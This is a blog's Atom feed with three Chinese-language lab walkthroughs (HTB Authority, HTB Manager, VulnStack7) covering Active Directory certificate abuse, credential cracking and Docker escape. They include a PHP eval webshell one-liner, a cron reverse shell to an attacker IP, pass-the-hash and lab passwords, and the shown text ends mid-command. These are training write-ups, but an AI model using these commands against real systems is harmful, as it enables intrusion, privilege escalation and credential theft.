<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ke1nys`Blog</title>
  
  <subtitle>q:1478456309</subtitle>
  <link href="https://ke1nys.github.io/atom.xml" rel="self"/>
  
  <link href="https://ke1nys.github.io/"/>
  <updated>2023-11-07T14:23:59.800Z</updated>
  <id>https://ke1nys.github.io/</id>
  
  <author>
    <name>ke1nys</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTB-Authority</title>
    <link href="https://ke1nys.github.io/posts/cd01b188.html"/>
    <id>https://ke1nys.github.io/posts/cd01b188.html</id>
    <published>2023-11-07T12:56:34.000Z</published>
    <updated>2023-11-07T14:23:59.800Z</updated>
    
    <content type="html"><![CDATA[<p>还是先扫一下  这里是推荐fscan和nmap同时扫  这样获取到的信息能多点</p><p><img src="../images/image-20231107210225491.png" alt="image-20231107210225491"></p><p><img src="../images/image-20231107210430826.png" alt="image-20231107210430826"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一共就是80 5985 8433 这个三个端口 其他端口一般是默认就开的</span><br><span class="line">域名 authority.htb</span><br><span class="line">80端口是个IIS服务器</span><br><span class="line">目标机器是个win主机</span><br></pre></td></tr></table></figure><p>收集到这些信息后  访问这个80端口的话是啥也没的 </p><p><img src="../images/image-20231107210816937.png" alt="image-20231107210816937"></p><p>然后就从其他方面入手  先尝试一下看看能不能匿名登录smb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.11.222 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107211019730.png" alt="image-20231107211019730"></p><p>只有这两个地方是我们能够访问的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.222/Department Shares/</span><br><span class="line"></span><br><span class="line">smbclient //10.10.11.222/vv/</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107211104961.png" alt="image-20231107211104961"></p><p>这里的话就发现只有Development这个共享文件夹能够访问到</p><p><img src="../images/image-20231107211201753.png" alt="image-20231107211201753"></p><p>开始查看看有哪些东西可以进行利用</p><p><img src="../images/image-20231107211329255.png" alt="image-20231107211329255"></p><p>这个文件夹名字的话  百度一下就会发现他是个配置管理工具  </p><blockquote><p>Ansible是一个开源配置管理工具，可以使用它来自动化任务，部署应用程序实现IT基础架构。Ansible可以用来自动化日常任务，比如，服务器的初始化配置、安全基线配置、更新和打补丁系统，安装软件包等</p></blockquote><p>那么我们就把其下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">recurse on 表明开启循环</span><br><span class="line"></span><br><span class="line">prompt off 表明关闭提示询问</span><br><span class="line"></span><br><span class="line">mget * 表示下载该目录下的所有文件</span><br></pre></td></tr></table></figure><p>然后开始查看这个文件下的目录</p><p><img src="../images/image-20231107211754056.png" alt="image-20231107211754056"></p><p>跟进这个PWM目录下就会发现  这是一个服务</p><blockquote><p>PWM（Password Management for LDAP Directory Services）可能是一种用于管理密码和凭证的系统，特别是用于与LDAP目录服务（例如OpenLDAP）一起使用。这可以包括密码策略管理、密码重置、自助服务、密码保险柜等功能，以帮助组织更好地管理用户凭证和密码策略。</p></blockquote><p><img src="../images/image-20231107211902199.png" alt="image-20231107211902199"></p><p>在这个目录下就会发现存在有些被vault加密过的字符串  然后我们就将其保存下来并爆破他</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">先保存在1.yml文件中</span><br><span class="line"></span><br><span class="line">ansible2john 1.yml &gt; vault1.in</span><br><span class="line">然后转化为可爆破的形式</span><br><span class="line">(这里选哪个字符串结果都是一样的  其实爆破加密字符串的实质都是爆破其外层加密的密码)</span><br><span class="line"></span><br><span class="line">然后再使用hashcat进行爆破</span><br><span class="line"></span><br><span class="line">hashcat -a 0 -m 16900 --force vault1.in /home/ke1nys/Desktop/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107212217521.png" alt="image-20231107212217521"></p><p>这里获取到的密码和上面的password啥关系都没  本质上就是加密的密码</p><p>我们通过获取到这个加密密码后   我们就可以通过其来进行解密获取到的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ansible localhost -m debug -a var=&quot;ldap_admin_password&quot; -e &quot;@Ansible/PWM/defaults/main.yml&quot; --vault-password-file=.vault_password</span><br><span class="line"></span><br><span class="line">//这里的话是将我们爆破出得到的密码存入到.vault_password中 也就是!@#$%^&amp;*</span><br><span class="line">//还有-e那里必须得写全路径  不然会报错 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107213115052.png" alt="image-20231107213115052"></p><p>三个挨个试就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwm_admin_password:  pWm_@dm!N_!23</span><br><span class="line"></span><br><span class="line">&quot;pwm_admin_login&quot;: &quot;svc_pwm&quot;</span><br><span class="line"></span><br><span class="line">&quot;ldap_admin_password&quot;: &quot;DevT3st@123&quot;</span><br></pre></td></tr></table></figure><p>试出三个密码后  我们回想到刚刚的那个8443的https端口处</p><p><img src="../images/image-20231107213359577.png" alt="image-20231107213359577"></p><p>其实在这里的关键就是下面的这两个  将获取到密码输入即可</p><p><img src="../images/image-20231107213753121.png" alt="image-20231107213753121"></p><p>将这里改为我们的地址  然后并且开启监听  然后点击上面的<code>Test LDAP Profile</code>  来使别的服务来连接我们</p><p><img src="../images/image-20231107213957831.png" alt="image-20231107213957831"></p><p>这个就是我们获取到的ldap用户的密码</p><p><img src="../images/image-20231107214559547.png" alt="image-20231107214559547"></p><p><img src="../images/image-20231107214627862.png" alt="image-20231107214627862"></p><p>evil-winrm去登录该用户(5985端口开了)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.222 -u &#x27;svc_ldap&#x27; -p &#x27;lDaP_1n_th3_cle4r!&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107214744554.png" alt="image-20231107214744554"></p><p>尝试提权  步骤应该是先跑sharphound  然后再看whoami /priv  然后再跑certify</p><p>这里的话就不跑sharphound了  域内就一个用户  </p><p><img src="../images/image-20231107215028183.png" alt="image-20231107215028183"></p><p>这里话由于是公共靶机  所以才导致这种情况的出现  实际上的话没有可利用权限的</p><p>所以这里就尝试跑这个Certify来看看有没有证书模板漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad find -u &#x27;svc_ldap@authority.htb&#x27;  -password &#x27;lDaP_1n_th3_cle4r!&#x27; -dc-ip 10.10.11.222 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p>这里的话就两个关键点</p><p><img src="../images/image-20231107215453299.png" alt="image-20231107215453299"></p><p><img src="../images/image-20231107215359288.png" alt="image-20231107215359288"></p><p>这里其实扫出来了这个ESC1 但是直接去搜文章的话是打不了的  这里的话还是用这个CVE-2022–26923这个来打</p><p><a href="https://forum.butian.net/share/1578">https://forum.butian.net/share/1578</a>    这篇文章很详细的分析了这个漏洞</p><p>先是创建个机器账户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py authority.htb/svc_ldap:&#x27;lDaP_1n_th3_cle4r!&#x27; -computer-name COMPUTER$ -computer-pass &#x27;COMPUTER&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107215834297.png" alt="image-20231107215834297"></p><p>成功添加这个机器账户  说明上面的CVE能打</p><p>然后接着去申请这个CornVPN模板证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad req -username COMPUTER$ -password &#x27;COMPUTER&#x27; -ca AUTHORITY-CA -target authority.htb -template CorpVPN  -upn administrator@authority.htb -debug</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107220001639.png" alt="image-20231107220001639"></p><p>申请成功 然后直接auth认证就行了</p><p><img src="../images/image-20231107220041342.png" alt="image-20231107220041342"></p><p>不出意外的话出意外了  </p><p><img src="../images/image-20231107220114097.png" alt="image-20231107220114097"></p><p>打网鼎半决赛靶机的时候遇到过这个问题  那么我们就换Schannel协议来打</p><p>先将.pfx文件转化为.key和.crt文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad cert -pfx administrator.pfx -nokey -out user.crt</span><br><span class="line">certipy-ad cert -pfx administrator.pfx -nocert -out user.key</span><br></pre></td></tr></table></figure><p>然后使用passthecert.py工具来测试是否成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 passthecert.py -action whoami -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231107220453143.png" alt="image-20231107220453143"></p><p>是admin权限  那么我们就直接上ldap_shell</p><p><img src="../images/image-20231107220802525.png" alt="image-20231107220802525"></p><p>这里之前加过了  所以不能再加了  然后直接再用evil-winrm连接上去就行了</p><p><img src="../images/image-20231107220913700.png" alt="image-20231107220913700"></p><p>拿下</p><p>总结一下  其实最后打域控这里的话没啥奇怪的东西  就是打一个简单的CVE 然后前面的ansible来获取账号密码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;还是先扫一下  这里是推荐fscan和nmap同时扫  这样获取到的信息能多点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231107210225491.png&quot; alt=&quot;image-20231107210225491&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;im</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://ke1nys.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Manager</title>
    <link href="https://ke1nys.github.io/posts/8d11f029.html"/>
    <id>https://ke1nys.github.io/posts/8d11f029.html</id>
    <published>2023-11-06T11:04:30.000Z</published>
    <updated>2023-11-07T14:23:59.803Z</updated>
    
    <content type="html"><![CDATA[<p>域渗透</p><p>先fscan扫一下</p><p><img src="../images/image-20231106191309453.png" alt="image-20231106191309453"></p><p>信息整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.236   80 88 1433 445 139 smb dc01 5985 winrm端口  manager.htb </span><br></pre></td></tr></table></figure><p>这里这个manager.htb的话fscan没扫出来  这里用nmap来扫</p><p><img src="../images/image-20231106192528047.png" alt="image-20231106192528047"></p><p>记得把这个域名加到hosts里  不然等会打的时候会失败</p><p>先去访问这个80端口</p><p>发现是个纯静态的网页  没办法入手 于是尝试进行cme来获取域内的用户 来爆破其密码</p><p><img src="../images/image-20231106192818921.png" alt="image-20231106192818921"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb manager.htb -u anonymous -p &quot;&quot; --rid-brute 100004</span><br><span class="line"></span><br><span class="line">//匿名爆破RID  来爆破出域内的用户</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106193106672.png" alt="image-20231106193106672"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SMB         manager.htb     445    DC01             1113: MANAGER\Zhong (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1114: MANAGER\Cheng (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1115: MANAGER\Ryan (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1116: MANAGER\Raven (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1117: MANAGER\JinWoo (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1118: MANAGER\ChinHae (SidTypeUser)</span><br><span class="line">SMB         manager.htb     445    DC01             1119: MANAGER\Operator (SidTypeUser)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106193627271.png" alt="image-20231106193627271"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的用户名和密码要小写来记录  </span><br></pre></td></tr></table></figure><p>然后使用cme来进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb manager.htb -u user.txt  -p user.txt</span><br></pre></td></tr></table></figure><p>最好爆破出密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb manager.htb -u user  -p user</span><br><span class="line"></span><br><span class="line">SMB         manager.htb     445    DC01             [+] manager.htb\operator:operator </span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194120494.png" alt="image-20231106194120494"></p><p>在尝试直接用这个账号密码来登录这个服务器主机的时候  失败了 我们回想到刚开始时的收集到地1这个mssql  直接使用impacket来连接  这里使用MUDT来连接也是可以的  但是这里的话因为这个没用物理机连vpn就不试了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient manager.htb/operator:operator@manager.htb -dc-ip 10.10.11.236 -windows-auth</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194152670.png" alt="image-20231106194152670"></p><p>发现命令执行不了  猜测不是sa权限  然后尝试看看能不能读取文件</p><p><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server?source=post_page-----9d4e32d363e4--------------------------------#manual-enumeration">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server?source=post_page-----9d4e32d363e4--------------------------------#manual-enumeration</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_dirtree &#x27;C:\&#x27;, 1, 1;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194301482.png" alt="image-20231106194301482"></p><p>发现是可读的  所以挨个尝试  发现了  网站目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_dirtree &#x27;C:\inetpub\wwwroot&#x27;, 1, 1;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106194347090.png" alt="image-20231106194347090"></p><p>访问这个路径并把文件下载下来  并且访问</p><p> <img src="../images/image-20231106195033622.png" alt="image-20231106195033622"></p><p>发现里面有一个域用户的账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raven    raven@manager.htb</span><br></pre></td></tr></table></figure><p>开了winrm服务的端口 </p><p>使用evil-winrm来进行连接  这里就能尝试成功了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.236 -u raven -p &#x27;R4v3nBe5tD3veloP3r!123&#x27;</span><br></pre></td></tr></table></figure><p>然后就能拿到flag</p><p><img src="../images/image-20231106201535113.png" alt="image-20231106201535113"></p><p>接下来这里的话我是直接跑那个sharphound</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm的话是可以使用upload来上传文件的</span><br><span class="line"></span><br><span class="line">upload /root/SharpHound.exe ./</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Invoke-WebRequest -Uri &quot;http://10.10.16.14:8000/Certify.exe&quot; -OutFile &quot;Certify.exe&quot;</span><br><span class="line">将sharpblood上传上去  (这个其实也可以上传)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SharpHound.exe --CollectionMethods All --Domain xiaorang.lab --ExcludeDCs</span><br></pre></td></tr></table></figure><p>挑了一下那两个用户来看  没发现啥有用的信息</p><p>然后跑一下certify 看看有没有证书漏洞可用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad find -u &#x27;raven@manager.htb&#x27;  -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -dc-ip 10.10.11.236 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106201552946.png" alt="image-20231106201552946"></p><p>然后直接去找这个模板的ESC7的POC来打就行了</p><p><a href="https://xz.aliyun.com/t/12267#toc-8">https://xz.aliyun.com/t/12267#toc-8</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad ca -ca &#x27;manager-DC01-CA&#x27; -add-officer raven -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad ca -ca &#x27;manager-DC01-CA&#x27; -enable-template SubCA -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad req -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ca &#x27;manager-DC01-CA&#x27; -target manager.htb -template SubCA -upn &#x27;administrator@manager.htb&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad ca -ca &#x27;manager-DC01-CA&#x27; -issue-request 13 -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">certipy-ad req -username &#x27;raven@manager.htb&#x27; -password &#x27;R4v3nBe5tD3veloP3r!123&#x27; -ca &#x27;manager-DC01-CA&#x27; -target manager.htb -retrieve 13</span><br><span class="line"></span><br><span class="line">//这里的13是会输出出来的  根据自己生成的来进行替换</span><br></pre></td></tr></table></figure><p>然后直接拿获取到的证书来进行身份验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy-ad auth -pfx administrator.pfx  -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure><p>这里会报错  因为时间不同  我们是东八区  用的vpn是欧洲的  时差7个小时 所以报错</p><p><img src="../images/image-20231106202018558.png" alt="image-20231106202018558"></p><p>使用faketime来操作就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime -f +7h certipy-ad auth -pfx ./administrator.pfx -dc-ip 10.10.11.236</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106201957024.png" alt="image-20231106201957024"></p><p>然后拿着hash值去打evil-winrm就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.11.236 -u Administrator -H &quot;ae5064c2f62317332c88629e025924ef&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231106202123442.png" alt="image-20231106202123442"></p><p>————— 总结</p><p>这里其实学习到的一点就是这个用cme来爆破RID来获取到域内的用户</p><p>然后mssql连上去的话不能使用xp_cmdshell来执行命令  只能用<code>EXEC xp_dirtree &#39;C:\inetpub\wwwroot&#39;, 1, 1;</code>来读取文件内容</p><p>然后就是最后的话就是用证书模板漏洞来打了  这个还行</p><p>ESC7</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;域渗透&lt;/p&gt;
&lt;p&gt;先fscan扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231106191309453.png&quot; alt=&quot;image-20231106191309453&quot;&gt;&lt;/p&gt;
&lt;p&gt;信息整理一下&lt;/p&gt;
&lt;figure cla</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://ke1nys.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>VulnStack7</title>
    <link href="https://ke1nys.github.io/posts/c08e5485.html"/>
    <id>https://ke1nys.github.io/posts/c08e5485.html</id>
    <published>2023-11-03T03:25:26.000Z</published>
    <updated>2023-11-07T14:23:59.804Z</updated>
    
    <content type="html"><![CDATA[<p>打之前把防火墙全关了  不然容易打一些步骤的时候会报错</p><p>这个靶机没云镜的好玩  域渗透的过程过于简单了  MS17梭哈全场</p><p>(实际上说是两层代理  其实就一层代理  52是可以出网的  只有93是内网)</p><p>防火墙记得关一下就行了</p><p><a href="https://www.freebuf.com/articles/network/264560.html">https://www.freebuf.com/articles/network/264560.html</a></p><p><a href="https://xz.aliyun.com/t/9574#toc-5">https://xz.aliyun.com/t/9574#toc-5</a></p><p>上面有搭建环境的步骤  就不写了这里</p><p>fscan扫一下这个ip <code>10.6.221.204</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/VulnStack]</span><br><span class="line">└─# ./fscan_amd64 -h 10.6.221.204 -p 1-10000   </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.6.221.204    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 1</span><br><span class="line">10.6.221.204:80 open</span><br><span class="line">10.6.221.204:22 open</span><br><span class="line">10.6.221.204:81 open</span><br><span class="line">10.6.221.204:6379 open</span><br><span class="line">[*] alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[+] Redis:10.6.221.204:6379 unauthorized file:/home/web/dump.rdb</span><br><span class="line">[+] Redis:10.6.221.204:6379 like can write /root/.ssh/</span><br><span class="line">[+] Redis:10.6.221.204:6379 like can write /var/spool/cron/</span><br><span class="line">[*] WebTitle: http://10.6.221.204:81    code:200 len:17474  title:Laravel</span><br><span class="line">[+] InfoScan:http://10.6.221.204:81    [Laravel] </span><br><span class="line">[+] http://10.6.221.204:81 poc-yaml-laravel-cve-2021-3129</span><br></pre></td></tr></table></figure><p>通过看这个fscan的结果可知  存在一个redis未授权和一个laravel的CVE</p><blockquote><p>80  81  22  6379</p></blockquote><p>直接打就行了 </p><p>这里先打这个laravel的CVE</p><p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/tree/main">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP/tree/main</a>  </p><p>直接用这个poc脚本来打就行了</p><p><img src="../images/image-20231103210805760.png" alt="image-20231103210805760"></p><p>记得用低于3版本的哥斯拉来连接  不然会报错连不上</p><p><img src="../images/image-20231103211201823.png" alt="image-20231103211201823"></p><p>这里我不习惯用哥斯拉  直接给当前网站写马连蚁剑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php @eval(\$_POST[1]);?&gt;&quot; &gt; 1.php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103211407028.png" alt="image-20231103211407028"></p><p>然后开始收集信息</p><p><img src="../images/image-20231103211424417.png" alt="image-20231103211424417"></p><p>发现ip啥的看不了  直接上cdk</p><p>wget或者从本地上传上去都是可行的方案</p><p><img src="../images/image-20231103211549491.png" alt="image-20231103211549491"></p><p>发现这个ip不太对劲  我们访问的是<code>http://10.6.221.204:81/</code>进来的   结果看到这个ip是172的</p><p><img src="../images/image-20231103211659113.png" alt="image-20231103211659113"></p><p>证实了我们的想法  是docker的 </p><p>于是开始尝试提权 </p><p><img src="../images/image-20231103211750091.png" alt="image-20231103211750091"></p><p>这个东西太显眼了  在用户下的一个命令</p><p><img src="../images/image-20231103211825267.png" alt="image-20231103211825267"></p><p>发现其会执行ps命令 那么我们如果加一个ps命令  并且修改PATH 然后让其优先于原来的ps  然后这样就可以进行提权了</p><p>先弹个shell到攻击机上 (蚁剑不太好操作提权)</p><p><img src="../images/image-20231103212504380.png" alt="image-20231103212504380"></p><p><img src="../images/image-20231103212512500.png" alt="image-20231103212512500"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH </span><br><span class="line">export PATH=/tmp:$PATH # 将/tmp添加到环境变量中，并且先加载执行/tmp里的程序</span><br><span class="line">cd /home/jobs</span><br><span class="line">./shell</span><br><span class="line"># 然后就获得了root权限，可以执行命令了</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103212820263.png" alt="image-20231103212820263"></p><p>拿下root权限后 我们尝试docker逃逸  这里用的是这个<strong>磁盘挂载逃逸(也是特权模式逃逸)</strong></p><p>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</p><p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p><p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p><p>首先我们现在docker中新建一个/hack目录用来挂在文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /hack</span><br><span class="line">mount /dev/sda1 /hack</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103212958092.png" alt="image-20231103212958092"></p><p>挂载成功 那么接下来我们就写定时任务反弹shell了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;* * * * * bash -i &gt;&amp; /dev/tcp/10.6.209.175/1235 0&gt;&amp;1&#x27; &gt;&gt; /hack/var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231103214048489.png" alt="image-20231103214048489"></p><p><img src="../images/image-20231103214118466.png" alt="image-20231103214118466"></p><p>但是收不到shell 直接手动弹过来</p><p><img src="../images/image-20231103214229261.png" alt="image-20231103214229261"></p><p><img src="../images/image-20231103214247931.png" alt="image-20231103214247931"></p><p>这里又有一个很有意思的点出现了  我们拿到docker的宿主机  但是发现其ip并不是我们所访问的ip  <code>10.6.221.204</code></p><p>这里可以猜测是开了nginx反向代理了   (先别慌  很有个redis主机还没拿下)</p><p>接下来就是打这个redis主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa #生成公钥</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt #将公钥导入foo.txt文件</span><br><span class="line">cat foo.txt | redis-cli -h 10.6.221.204 -p 6379 -x set hello 